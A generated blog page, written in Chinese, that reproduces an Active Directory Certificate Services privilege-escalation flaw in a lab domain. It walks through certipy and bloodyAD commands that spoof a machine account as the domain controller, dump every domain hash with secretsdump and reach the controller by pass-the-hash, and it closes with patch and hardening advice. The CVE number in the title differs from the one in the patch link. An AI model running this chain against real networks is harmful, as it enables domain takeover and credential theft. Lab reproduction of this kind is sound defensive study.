@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 漏洞描述Active Directory 域权限提升漏洞(CVE-2022-26963 )允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。 0x02 影响范围受影响的 Windows 版本： Windows 8.1 Windows 10 Version 1607, 1809">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域权限提升漏洞-CVE-2022-26963-复现">
+<meta property="og:url" content="http://example.com/posts/1245293890/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="0x01 漏洞描述Active Directory 域权限提升漏洞(CVE-2022-26963 )允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。 0x02 影响范围受影响的 Windows 版本： Windows 8.1 Windows 10 Version 1607, 1809">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618173249045.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618173427426.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618174500796.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618174825103.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618175703809.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618180139453.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618180304119.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618180640378.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618180754693.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618181026478.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618181158661.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618181437662.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618181626301.png">
+<meta property="article:published_time" content="2022-06-18T08:37:22.000Z">
+<meta property="article:modified_time" content="2022-06-18T10:29:18.214Z">
+<meta property="article:author" content="1in3r">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typro-1304950244.file.myqcloud.com/image-20220618173249045.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>域权限提升漏洞-CVE-2022-26963-复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/3129367605/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/1245293890/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/1245293890/&text=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/1245293890/&is_video=false&description=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域权限提升漏洞-CVE-2022-26963-复现&body=Check out this article: http://example.com/posts/1245293890/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/1245293890/&name=域权限提升漏洞-CVE-2022-26963-复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/1245293890/&t=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.</span> <span class="toc-text">0x02 影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Windows-Active-Directory-AD"><span class="toc-number">3.</span> <span class="toc-text">0x03 Windows Active Directory (AD)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Active-Directory-%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">0x04 Active Directory 证书服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%9F%9F%E7%8E%AF%E5%A2%83Build"><span class="toc-number">5.</span> <span class="toc-text">0x05 域环境Build</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text">0x06 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEDNS"><span class="toc-number">6.1.</span> <span class="toc-text">配置DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8DCA%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.2.</span> <span class="toc-text">定位CA服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%B5%8B%E8%AF%95%E8%AF%81%E4%B9%A6"><span class="toc-number">6.3.</span> <span class="toc-text">生成测试证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="toc-number">6.4.</span> <span class="toc-text">创建机器账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%81%E4%B9%A6"><span class="toc-number">6.5.</span> <span class="toc-text">伪造恶意证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7hash"><span class="toc-number">6.6.</span> <span class="toc-text">转储所有用户hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">0x07 修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        域权限提升漏洞-CVE-2022-26963-复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">1in3r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-18T08:37:22.000Z" itemprop="datePublished">2022-06-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Active Directory 域权限提升漏洞(CVE-2022-26963 )允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。</p>
+<h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><p>受影响的 Windows 版本：</p>
+<p>Windows 8.1</p>
+<p>Windows 10 Version 1607, 1809,1909, 2004, 20H2, 21H1, 21H2</p>
+<p>Windows 11</p>
+<p>Windows Server 2008，2012，2016，2019，2022</p>
+<h2 id="0x03-Windows-Active-Directory-AD"><a href="#0x03-Windows-Active-Directory-AD" class="headerlink" title="0x03 Windows Active Directory (AD)"></a>0x03 Windows Active Directory (AD)</h2><p>AD是微软所提供的目录服务（查询，身份验证），活动目录的核心包含了活动目录数据库，在活动目录数据库中包含了域中所有的对象（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server 以及Windows Datacenter Server的目录服务</p>
+<p>AD不仅用于身份和访问管理，还提供大量服务来帮助您运行和管理您的组织。其中许多服务鲜为人知或使用较少，这意味着在执行安全强化时它们经常被忽视。其中一项服务是 Active Directory 证书服务 (AD CS)。</p>
+<h2 id="0x04-Active-Directory-证书服务"><a href="#0x04-Active-Directory-证书服务" class="headerlink" title="0x04 Active Directory 证书服务"></a>0x04 Active Directory 证书服务</h2><p>AD CS 是 Microsoft 的公钥基础结构 (PKI) 实施。由于AD在组织中提供了一定程度的信任，因此它可以用作CA来证明和委托信任。</p>
+<p>AD CS 用于多种用途，例如加密文件系统、创建和验证数字签名，甚至是用户身份验证，这也给攻击者提供了良好的攻击途径；因证书可以在凭证轮换中幸存下来，这意味着即使重置了受损帐户的密码，也不会使恶意生成的证书无效，从而提供长达 10 年的持续凭证盗窃！</p>
+<h2 id="0x05-域环境Build"><a href="#0x05-域环境Build" class="headerlink" title="0x05 域环境Build"></a>0x05 域环境Build</h2><p>安装AD CS以及AD DS</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618173249045.png" alt="image-20220618173249045"></p>
+<p>添加一个普通域用户fbl\test:QWE@123</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618173427426.png" alt="image-20220618173427426"></p>
+<h2 id="0x06-漏洞复现"><a href="#0x06-漏洞复现" class="headerlink" title="0x06 漏洞复现"></a>0x06 漏洞复现</h2><h3 id="配置DNS"><a href="#配置DNS" class="headerlink" title="配置DNS"></a>配置DNS</h3><p>修改&#x2F;etc&#x2F;hosts文件添加以下条目</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.189.140 dc.fbl.com fbl-DC-CA fbl.com dc</span><br></pre></td></tr></table></figure>
+
+<h3 id="定位CA服务器"><a href="#定位CA服务器" class="headerlink" title="定位CA服务器"></a>定位CA服务器</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-config</span> - <span class="literal">-ping</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618174500796.png" alt="image-20220618174500796"></p>
+<h3 id="生成测试证书"><a href="#生成测试证书" class="headerlink" title="生成测试证书"></a>生成测试证书</h3><p><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">需要安装certipy工具</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req <span class="string">&#x27;fbi/test:QWE@123@dc.fbl.com&#x27;</span> <span class="literal">-ca</span> fbl<span class="literal">-DC-CA</span> <span class="literal">-template</span> User</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618174825103.png" alt="image-20220618174825103"></p>
+<p>验证证书是否有效</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth <span class="literal">-pfx</span> test.pfx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618175703809.png" alt="image-20220618175703809"></p>
+<h3 id="创建机器账户"><a href="#创建机器账户" class="headerlink" title="创建机器账户"></a>创建机器账户</h3><p><a target="_blank" rel="noopener" href="https://github.com/CravateRouge/bloodyAD">需要安装bloodyAD工具</a></p>
+<p>查看ms-DS-MachineAccountQuota属性，如果ms-DS-MachineAccountQuota&gt;0就可以创建机器帐户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bloodyAD.py -d fbl.com -u <span class="built_in">test</span> -p <span class="string">&#x27;QWE@123&#x27;</span> --host 192.168.189.140 getObjectAttributes <span class="string">&#x27;DC=fbl,DC=com&#x27;</span> ms-DS-MachineAccountQuota</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618180139453.png" alt="image-20220618180139453"></p>
+<p>在LDAP中创建一个机器帐户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bloodyAD.py -d fbl.com -u <span class="built_in">test</span> -p <span class="string">&#x27;QWE@123&#x27;</span> --host 192.168.189.140 addComputer testPC <span class="string">&#x27;QWE@123&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618180304119.png" alt="image-20220618180304119"></p>
+<p>更新机器帐户的DNSHostName，将机器帐户的DNSHostName改为域控的DC.fbl.com</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bloodyAD.py -d fbl.com -u <span class="built_in">test</span> -p <span class="string">&#x27;QWE@123&#x27;</span> --host 192.168.189.140 setAttribute <span class="string">&#x27;CN=testPC,CN=Computers,DC=fbl,DC=com&#x27;</span> DNSHostName <span class="string">&#x27;[&quot;DC.fbl.com&quot;]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618180640378.png" alt="image-20220618180640378"></p>
+<p>查看属性，成功更改DNSHosName为DC.fbl.com</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bloodyAD.py -d fbl.com -u <span class="built_in">test</span> -p <span class="string">&#x27;QWE@123&#x27;</span> --host 192.168.189.140 getObjectAttributes <span class="string">&#x27;CN=testPC,CN=Computers,DC=fbl,DC=com&#x27;</span> DNSHostName</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618180754693.png" alt="image-20220618180754693"></p>
+<h3 id="伪造恶意证书"><a href="#伪造恶意证书" class="headerlink" title="伪造恶意证书"></a>伪造恶意证书</h3><p>运行Certipy生成机器证书，可以看到DNSHostName已经变成了DC.fBl.com</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req <span class="string">&#x27;fbl.com/testPC$:QWE@123@dc.fbl.com&#x27;</span> -ca fbl-DC-CA -template Machine -debug</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618181026478.png" alt="image-20220618181026478"></p>
+<p>再次验证证书是否有效，可以看到成功获取到hash</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618181158661.png" alt="image-20220618181158661"></p>
+<h3 id="转储所有用户hash"><a href="#转储所有用户hash" class="headerlink" title="转储所有用户hash"></a>转储所有用户hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py  <span class="string">&#x27;fbl.com/dc$@dc.fbl.com&#x27;</span> -hashes  :4a26c4eec5f1d03b25afc22108d80d2c </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618181437662.png" alt="image-20220618181437662"></p>
+<p>那么可以直接pth DC</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py  <span class="string">&#x27;fbl.com/administrator@dc.fbl.com&#x27;</span> -hashes  :c6d2a1d1163cab5b985ff8d80850625d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220618181626301.png" alt="image-20220618181626301"></p>
+<h2 id="0x07-修复方案"><a href="#0x07-修复方案" class="headerlink" title="0x07 修复方案"></a>0x07 修复方案</h2><p>1.补丁地址:<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923</a></p>
+<p>2.新证书中引入了新的对象 ID (OID)，以进一步对用户进行指纹识别。这是通过在新的szOID_NTDS_CA_SECURITY_EXT OID 中嵌入用户的 objectSid 来完成的。</p>
+<p>3.”验证写入DNS主机名”权限现在只允许您将 DNSHostname 设置为与 SAM 帐户名或计算机帐户匹配的属性，这意味着它不能用于欺骗其他主机的帐户名。</p>
+<p>4.确保您的证书模板受到限制。仅在需要时才允许机器和用户自动注册。否则，通过安全配置，可以减少这些模板的权限。</p>
+<p>5.如果没有允许用户将主机注册到 AD 的商业案例，请将所有不应注册新主机的帐户的 MS-DS-Machine-Account-Quota 属性更改为 0。然而，这并不能解决问题，因为攻击者只需获得对单个加入域的主机的管理访问权限，就可以执行证书请求。</p>
+<h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AuPajld1K7N5alAkgMZNfA">https://mp.weixin.qq.com/s/AuPajld1K7N5alAkgMZNfA</a> </p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.</span> <span class="toc-text">0x02 影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Windows-Active-Directory-AD"><span class="toc-number">3.</span> <span class="toc-text">0x03 Windows Active Directory (AD)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Active-Directory-%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">0x04 Active Directory 证书服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%9F%9F%E7%8E%AF%E5%A2%83Build"><span class="toc-number">5.</span> <span class="toc-text">0x05 域环境Build</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text">0x06 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEDNS"><span class="toc-number">6.1.</span> <span class="toc-text">配置DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8DCA%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.2.</span> <span class="toc-text">定位CA服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%B5%8B%E8%AF%95%E8%AF%81%E4%B9%A6"><span class="toc-number">6.3.</span> <span class="toc-text">生成测试证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="toc-number">6.4.</span> <span class="toc-text">创建机器账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%81%E4%B9%A6"><span class="toc-number">6.5.</span> <span class="toc-text">伪造恶意证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7hash"><span class="toc-number">6.6.</span> <span class="toc-text">转储所有用户hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">0x07 修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/1245293890/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/1245293890/&text=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/1245293890/&is_video=false&description=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域权限提升漏洞-CVE-2022-26963-复现&body=Check out this article: http://example.com/posts/1245293890/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/1245293890/&title=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/1245293890/&name=域权限提升漏洞-CVE-2022-26963-复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/1245293890/&t=域权限提升漏洞-CVE-2022-26963-复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    1in3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
